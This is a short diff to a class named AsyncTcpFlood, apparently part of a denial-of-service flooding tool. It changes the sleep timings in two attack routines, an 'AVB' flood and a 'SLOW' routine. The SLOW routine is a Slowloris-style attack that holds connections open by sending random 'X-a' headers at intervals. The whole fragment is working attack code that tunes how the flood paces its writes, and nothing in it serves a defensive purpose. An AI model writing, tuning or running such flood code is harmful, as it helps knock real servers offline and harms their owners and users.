@@ -487,11 +487,10 @@ class AsyncTcpFlood:
     async def AVB(self, on_connect=None) -> bool:
         packet: bytes = self.build_request()
         packet_size: int = len(packet)
-        delay: float = max(self._settings.requests_per_connection / 1000, 1)
 
         def _gen():
             for _ in range(self._settings.requests_per_connection):
-                yield FloodOp.SLEEP, delay
+                yield FloodOp.SLEEP, 1
                 yield FloodOp.WRITE, (packet, packet_size)
 
         return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)
@@ -499,7 +498,6 @@ class AsyncTcpFlood:
     async def SLOW(self, on_connect=None) -> bool:
         packet: bytes = self.build_request()
         packet_size: int = len(packet)
-        delay: float = self._settings.requests_per_connection / 15
 
         def _gen():
             for _ in range(self._settings.requests_per_connection):
@@ -512,7 +510,7 @@ class AsyncTcpFlood:
                 #      this attack has to be re-tested
                 keep = str.encode("X-a: %d\r\n" % random.randint(1, 5000))
                 yield FloodOp.WRITE, (keep, len(keep))
-                yield FloodOp.SLEEP, delay
+                yield FloodOp.SLEEP, 10
 
         return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)
 
